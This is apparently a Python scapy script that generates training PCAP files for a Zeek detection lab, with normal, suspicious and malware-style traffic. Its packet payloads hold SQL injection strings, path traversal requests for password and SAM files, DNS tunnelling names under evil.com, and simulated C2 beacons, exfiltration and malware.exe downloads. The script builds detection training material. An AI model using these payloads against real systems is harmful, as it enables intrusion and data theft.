#!/usr/bin/env python3
"""
Generate PCAP files for Zeek lab
Creates suspicious_traffic.pcap, normal_traffic.pcap, and sample_malware_conn.pcap
"""

import os
import sys
import time
import random
import struct
import socket
from datetime import datetime

# Try to import scapy
try:
    from scapy.all import *
    from scapy.layers.inet import IP, TCP, UDP, ICMP
    from scapy.layers.http import HTTP, HTTPRequest, HTTPResponse
    from scapy.layers.dns import DNS, DNSQR, DNSRR
except ImportError:
    print("Installing scapy...")
    os.system("pip install scapy")
    from scapy.all import *

def generate_suspicious_traffic():
    """Generate suspicious network traffic patterns"""
    packets = []
    
    # Port scanning from 192.168.1.100
    scanner_ip = "192.168.1.100"
    target_ip = "192.168.1.10"
    
    print("Generating port scan traffic...")
    common_ports = [21, 22, 23, 25, 80, 110, 135, 139, 443, 445, 1433, 3306, 3389, 8080]
    for port in common_ports:
        # SYN scan
        syn = IP(src=scanner_ip, dst=target_ip)/TCP(sport=random.randint(1024, 65535), dport=port, flags="S")
        packets.append(syn)
        # Some ports respond with RST
        if port not in [22, 80, 443]:
            rst = IP(src=target_ip, dst=scanner_ip)/TCP(sport=port, dport=syn[TCP].sport, flags="RA", seq=0, ack=syn[TCP].seq+1)
            packets.append(rst)
    
    # SSH Brute Force from 203.0.113.50
    bruteforce_ip = "203.0.113.50"
    ssh_target = "192.168.1.20"
    
    print("Generating SSH brute force attempts...")
    for i in range(10):
        sport = random.randint(40000, 50000)
        # Connection attempt
        syn = IP(src=bruteforce_ip, dst=ssh_target)/TCP(sport=sport, dport=22, flags="S")
        syn_ack = IP(src=ssh_target, dst=bruteforce_ip)/TCP(sport=22, dport=sport, flags="SA")
        ack = IP(src=bruteforce_ip, dst=ssh_target)/TCP(sport=sport, dport=22, flags="A")
        packets.extend([syn, syn_ack, ack])
        
        # Failed auth (connection reset)
        rst = IP(src=ssh_target, dst=bruteforce_ip)/TCP(sport=22, dport=sport, flags="R")
        packets.append(rst)
    
    # SQL Injection attempts
    print("Generating SQL injection attempts...")
    sqli_payloads = [
        "/login.php?user=admin' OR '1'='1",
        "/search.php?q=' UNION SELECT * FROM users--",
        "/product.php?id=1; DROP TABLE users--",
        "/admin/index.php?username=admin'--&password=test"
    ]
    
    attacker_ip = "198.51.100.15"
    web_server = "192.168.1.80"
    
    for payload in sqli_payloads:
        sport = random.randint(50000, 60000)
        
        # Three-way handshake first
        syn = IP(src=attacker_ip, dst=web_server)/TCP(sport=sport, dport=80, flags="S", seq=1000)
        syn_ack = IP(src=web_server, dst=attacker_ip)/TCP(sport=80, dport=sport, flags="SA", seq=2000, ack=1001)
        ack = IP(src=attacker_ip, dst=web_server)/TCP(sport=sport, dport=80, flags="A", seq=1001, ack=2001)
        packets.extend([syn, syn_ack, ack])
        
        # HTTP request with SQL injection
        http_req = (
            IP(src=attacker_ip, dst=web_server)/
            TCP(sport=sport, dport=80, flags="PA", seq=1001, ack=2001)/
            Raw(load=f"GET {payload} HTTP/1.1\r\nHost: vulnerable.site\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n")
        )
        packets.append(http_req)
        
        # Server ACK
        srv_ack = IP(src=web_server, dst=attacker_ip)/TCP(sport=80, dport=sport, flags="A", seq=2001, ack=1001+len(http_req[Raw].load))
        packets.append(srv_ack)
        
        # Server response
        http_resp = (
            IP(src=web_server, dst=attacker_ip)/
            TCP(sport=80, dport=sport, flags="PA", seq=2001, ack=1001+len(http_req[Raw].load))/
            Raw(load="HTTP/1.1 500 Internal Server Error\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
        )
        packets.append(http_resp)
    
    # Directory traversal attempts
    print("Generating directory traversal attempts...")
    traversal_payloads = [
        "/files/../../../../etc/passwd",
        "/download.php?file=../../../etc/shadow",
        "/include.php?page=../../../../windows/system32/config/sam"
    ]
    
    for payload in traversal_payloads:
        sport = random.randint(45000, 55000)
        http_req = (
            IP(src=attacker_ip, dst=web_server)/
            TCP(sport=sport, dport=80, flags="PA")/
            Raw(load=f"GET {payload} HTTP/1.1\r\nHost: vulnerable.site\r\nUser-Agent: Mozilla/5.0\r\n\r\n")
        )
        packets.append(http_req)
    
    # DNS tunneling attempts
    print("Generating DNS tunneling traffic...")
    dns_tunnel_domains = [
        "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6q7r8s9t0u1v2w3x4y5z6.tunnel.evil.com",
        "ZXhlY3V0ZWNvbW1hbmRoZXJlYmFzZTY0ZW5jb2RlZA.data.evil.com",
        "0123456789abcdef0123456789abcdef0123456789abcdef.exfil.evil.com"
    ]
    
    for domain in dns_tunnel_domains:
        dns_query = (
            IP(src="192.168.1.50", dst="8.8.8.8")/
            UDP(sport=random.randint(1024, 65535), dport=53)/
            DNS(qd=DNSQR(qname=domain))
        )
        packets.append(dns_query)
    
    # HTTP without proper headers (bot/malware traffic)
    print("Generating malformed HTTP traffic...")
    # Missing User-Agent
    malformed_http = (
        IP(src="192.168.1.101", dst=web_server)/
        TCP(sport=random.randint(30000, 40000), dport=80, flags="PA")/
        Raw(load="GET /update.php HTTP/1.1\r\nHost: cnc.malware.com\r\n\r\n")
    )
    packets.append(malformed_http)
    
    # HTTP on HTTPS port
    http_on_https = (
        IP(src="192.168.1.102", dst=web_server)/
        TCP(sport=random.randint(35000, 45000), dport=443, flags="PA")/
        Raw(load="GET /secure HTTP/1.0\r\n\r\n")
    )
    packets.append(http_on_https)
    
    return packets

def generate_normal_traffic():
    """Generate normal network traffic patterns"""
    packets = []
    
    print("Generating normal web browsing traffic...")
    client_ip = "192.168.1.30"
    web_servers = ["93.184.216.34", "151.101.1.140", "172.217.14.100"]
    
    for server in web_servers:
        sport = random.randint(50000, 60000)
        # Normal HTTP request
        http_req = (
            IP(src=client_ip, dst=server)/
            TCP(sport=sport, dport=80, flags="PA")/
            Raw(load="GET /index.html HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n")
        )
        packets.append(http_req)
        
        # Normal response
        http_resp = (
            IP(src=server, dst=client_ip)/
            TCP(sport=80, dport=sport, flags="PA")/
            Raw(load="HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html><body>Normal Page</body></html>")
        )
        packets.append(http_resp)
    
    print("Generating normal DNS queries...")
    domains = ["google.com", "facebook.com", "amazon.com", "microsoft.com"]
    for domain in domains:
        dns_query = (
            IP(src=client_ip, dst="8.8.8.8")/
            UDP(sport=random.randint(1024, 65535), dport=53)/
            DNS(qd=DNSQR(qname=domain))
        )
        packets.append(dns_query)
    
    return packets

def generate_malware_traffic():
    """Generate malware C2 beacon traffic"""
    packets = []
    
    print("Generating malware C2 beacon traffic...")
    infected_host = "192.168.1.75"
    c2_server = "185.220.101.50"
    
    # Regular beacon pattern (every 60 seconds simulated)
    for i in range(10):
        sport = random.randint(40000, 50000)
        
        # Beacon check-in
        beacon = (
            IP(src=infected_host, dst=c2_server)/
            TCP(sport=sport, dport=443, flags="PA")/
            Raw(load=f"POST /beacon HTTP/1.1\r\nHost: c2.malware.net\r\nContent-Length: 32\r\n\r\n{{\"id\":\"infected01\",\"status\":\"alive\"}}")
        )
        packets.append(beacon)
        
        # C2 response
        response = (
            IP(src=c2_server, dst=infected_host)/
            TCP(sport=443, dport=sport, flags="PA")/
            Raw(load="HTTP/1.1 200 OK\r\n\r\n{\"cmd\":\"wait\"}")
        )
        packets.append(response)
    
    # Data exfiltration
    print("Generating data exfiltration traffic...")
    for i in range(5):
        sport = random.randint(45000, 55000)
        # Large POST request (exfiltration)
        exfil = (
            IP(src=infected_host, dst=c2_server)/
            TCP(sport=sport, dport=443, flags="PA")/
            Raw(load=f"POST /upload HTTP/1.1\r\nHost: c2.malware.net\r\nContent-Length: 10240\r\n\r\n" + "A"*10240)
        )
        packets.append(exfil)
    
    # File transfer - simulate downloading a file
    print("Generating file transfer traffic...")
    file_content = b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff" + b"\x00" * 1000  # PE header
    
    sport = random.randint(50000, 60000)
    
    # TCP handshake
    syn = IP(src=infected_host, dst=c2_server)/TCP(sport=sport, dport=80, flags="S", seq=1000)
    syn_ack = IP(src=c2_server, dst=infected_host)/TCP(sport=80, dport=sport, flags="SA", seq=2000, ack=1001)
    ack = IP(src=infected_host, dst=c2_server)/TCP(sport=sport, dport=80, flags="A", seq=1001, ack=2001)
    packets.extend([syn, syn_ack, ack])
    
    # HTTP GET request
    http_get = (
        IP(src=infected_host, dst=c2_server)/
        TCP(sport=sport, dport=80, flags="PA", seq=1001, ack=2001)/
        Raw(load="GET /malware.exe HTTP/1.1\r\nHost: evil.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n")
    )
    packets.append(http_get)
    
    # HTTP response with file
    http_response = (
        IP(src=c2_server, dst=infected_host)/
        TCP(sport=80, dport=sport, flags="PA", seq=2001, ack=1001+len(http_get[Raw].load))/
        Raw(load=f"HTTP/1.1 200 OK\r\nContent-Type: application/x-msdownload\r\nContent-Length: {len(file_content)}\r\n\r\n".encode() + file_content)
    )
    packets.append(http_response)
    
    return packets

def main():
    print("Generating PCAP files for Zeek lab...")
    
    # Generate suspicious traffic
    print("\n[*] Creating suspicious_traffic.pcap...")
    suspicious_packets = generate_suspicious_traffic()
    wrpcap("suspicious_traffic.pcap", suspicious_packets)
    print(f"    Generated {len(suspicious_packets)} packets")
    
    # Generate normal traffic
    print("\n[*] Creating normal_traffic.pcap...")
    normal_packets = generate_normal_traffic()
    wrpcap("normal_traffic.pcap", normal_packets)
    print(f"    Generated {len(normal_packets)} packets")
    
    # Generate malware traffic
    print("\n[*] Creating sample_malware_conn.pcap...")
    malware_packets = generate_malware_traffic()
    wrpcap("sample_malware_conn.pcap", malware_packets)
    print(f"    Generated {len(malware_packets)} packets")
    
    print("\n[+] All PCAP files generated successfully!")
    print("    - suspicious_traffic.pcap")
    print("    - normal_traffic.pcap")
    print("    - sample_malware_conn.pcap")

if __name__ == "__main__":
    main()
